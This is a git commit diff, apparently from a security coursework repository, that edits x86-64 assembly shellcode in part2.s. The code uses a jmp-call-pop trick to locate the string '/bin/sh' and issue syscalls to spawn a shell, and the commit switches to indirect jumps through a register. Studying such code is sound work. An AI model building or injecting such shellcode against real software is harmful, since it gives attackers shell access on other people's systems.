706f47141794f2dba7028a3a94531d43eddc6f3a
rishdas <sirshakdas@gmail.com>
2016-02-26 13:12:29 -0500

    Try indirect addressing

--- part2.s
+++ part2.s
@@ -1,6 +1,8 @@
 	.section .text
+	.global _start
 _start:
-	jmp     *27(%rip)
+	leaq    30(%rip), %r13
+	jmp     *%r13
 	popq    %rdi
 	xor     %r10d, %r10d		#XOR to store 0 to be used later
 	movl	%r10d, %edx
@@ -10,5 +12,6 @@ _start:
 	movl	%r10d, %edi
 	leal    60(%r10d), %eax		#exit(0) system call
 	syscall
-	call    *-33(%rip)		#to return the call to the exec call with return addr
+	leaq    -34(%rip), %r13
+	call    *%r13		#to return the call to the exec call with return addr
 	.string "/bin/sh\0"		#The command to executed stored in return addr of call
